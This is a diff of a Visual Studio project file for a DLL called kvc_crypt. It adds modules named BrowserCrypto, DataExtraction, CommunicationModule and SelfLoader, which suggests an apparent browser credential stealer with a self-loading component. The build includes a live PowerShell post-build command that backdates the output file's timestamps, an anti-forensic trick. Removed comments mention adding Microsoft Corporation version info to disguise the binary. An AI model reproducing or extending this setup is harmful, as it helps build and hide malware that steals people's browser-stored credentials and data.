@@ -64,25 +64,28 @@
       <Command>powershell -Command "&amp; {$f='$(OutDir)$(TargetName)$(TargetExt)'; (Get-Item $f).CreationTime='2026-01-01 00:00:00'; (Get-Item $f).LastWriteTime='2026-01-01 00:00:00'}"</Command>
     </PostBuildEvent>
     <ResourceCompile>
-      <!-- Fixed: Removed NO_RESOURCES to enable Microsoft Corporation version info -->
       <Culture>0x0409</Culture>
     </ResourceCompile>
   </ItemDefinitionGroup>
   <ItemGroup>
-    <ClCompile Include="kvc_crypt.cpp" />
+    <ClCompile Include="CryptCore.cpp" />
+    <ClCompile Include="BrowserCrypto.cpp" />
+    <ClCompile Include="DataExtraction.cpp" />
+    <ClCompile Include="CommunicationModule.cpp" />
     <ClCompile Include="SelfLoader.cpp" />
   </ItemGroup>
   <ItemGroup>
-    <!-- Fixed: Enabled resource.h include -->
+    <ClInclude Include="CryptCore.h" />
+    <ClInclude Include="BrowserCrypto.h" />
+    <ClInclude Include="DataExtraction.h" />
+    <ClInclude Include="CommunicationModule.h" />
     <ClInclude Include="resource.h" />
     <ClInclude Include="SelfLoader.h" />
     <ClInclude Include="winsqlite3.h" />
   </ItemGroup>
   <ItemGroup>
-    <!-- Fixed: Added resource file for Microsoft Corporation version info -->
     <ResourceCompile Include="kvc_crypt.rc" />
   </ItemGroup>
-  <!-- ADD TARGET FOR RESOURCE CLEANING -->
   <Target Name="RemoveVCRuntimeResources" AfterTargets="Link">
     <Exec Command="if exist &quot;@(FinalOutputPath)&quot; echo Building minimal DLL..." />
   </Target>
